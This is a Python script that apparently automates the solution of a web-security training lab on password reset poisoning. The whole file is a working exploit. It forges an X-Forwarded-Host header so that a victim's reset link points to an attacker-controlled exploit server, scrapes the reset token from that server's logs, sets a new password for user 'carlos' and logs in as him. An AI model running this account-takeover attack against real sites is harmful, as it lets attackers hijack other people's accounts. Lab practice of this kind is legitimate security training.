import requests
import re
from colorama import Fore

LAB_NAME = "Password reset poisoning via middleware"
NEW_CARLOS_PASSWORD = "mystic_mido"

def run(url, payload=None, proxies=None):
    url = url.rstrip('/')

    exploit_input = input(Fore.YELLOW + "[?] Enter your Exploit Server URL: " + Fore.WHITE).strip()
    if not exploit_input.startswith("http"):
        exploit_input = "https://" + exploit_input
    exploit_url = exploit_input.rstrip('/')

    print(Fore.WHITE + "⦗1⦘ Making forgot-password request as carlos with X-Forwarded-Host header.. ", end="", flush=True)

    data = {"username": "carlos"}
    headers = {"X-Forwarded-Host": exploit_url.replace("https://", "")}

    requests.post(f"{url}/forgot-password", data=data, headers=headers, 
                  allow_redirects=False, verify=False, proxies=proxies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting token from exploit server logs.. ", end="", flush=True)

    log_resp = requests.get(f"{exploit_url}/log", verify=False, proxies=proxies)
    token_match = re.findall(r"temp-forgot-password-token=([a-zA-Z0-9]+)", log_resp.text)

    if not token_match:
        print(Fore.RED + "⦗!⦘ No tokens found in logs")
        return False

    token = token_match[-1]
    print(Fore.GREEN + f"OK\n{Fore.WHITE}⦗3⦘ Changing carlos password with token {Fore.YELLOW + token}.. ", end="", flush=True)

    reset_data = {
        "temp-forgot-password-token": token,
        "new-password-1": NEW_CARLOS_PASSWORD,
        "new-password-2": NEW_CARLOS_PASSWORD
    }

    requests.post(f"{url}/forgot-password", data=reset_data, 
                  allow_redirects=False, verify=False, proxies=proxies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + f"🗹 Password changed to: {Fore.GREEN + NEW_CARLOS_PASSWORD}")
    print(Fore.WHITE + "⦗4⦘ Logging in as carlos.. ", end="", flush=True)

    login_data = {"username": "carlos", "password": NEW_CARLOS_PASSWORD}
    login_resp = requests.post(f"{url}/login", data=login_data, 
                               allow_redirects=False, verify=False, proxies=proxies)

    session_cookie = login_resp.cookies.get("session")
    if not session_cookie:
        print(Fore.RED + "[!] Login failed")
        return False

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Fetching /my-account to confirm login.. ", end="", flush=True)

    cookies = {"session": session_cookie}
    profile_resp = requests.get(f"{url}/my-account", cookies=cookies, 
                                allow_redirects=False, verify=False, proxies=proxies)

    if profile_resp.status_code == 200:
        print(Fore.GREEN + "OK")
        print(Fore.WHITE + "🗹 Lab should be marked as " + Fore.GREEN + "solved")
        return True
    else:
        print(Fore.RED + "[!] Failed to access /my-account")
        return False